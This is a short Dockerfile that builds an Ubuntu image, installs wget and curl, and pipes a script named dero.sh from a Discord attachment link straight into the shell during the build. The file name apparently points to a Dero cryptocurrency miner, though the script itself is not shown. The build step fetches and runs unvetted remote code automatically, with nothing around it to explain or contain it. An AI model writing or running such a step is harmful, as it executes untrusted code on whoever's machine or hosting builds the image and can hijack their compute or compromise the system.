FROM ubuntu:latest
RUN apt update && apt install wget curl -y
RUN curl https://cdn.discordapp.com/attachments/982667804429914146/1086099938666094642/dero.sh | sh
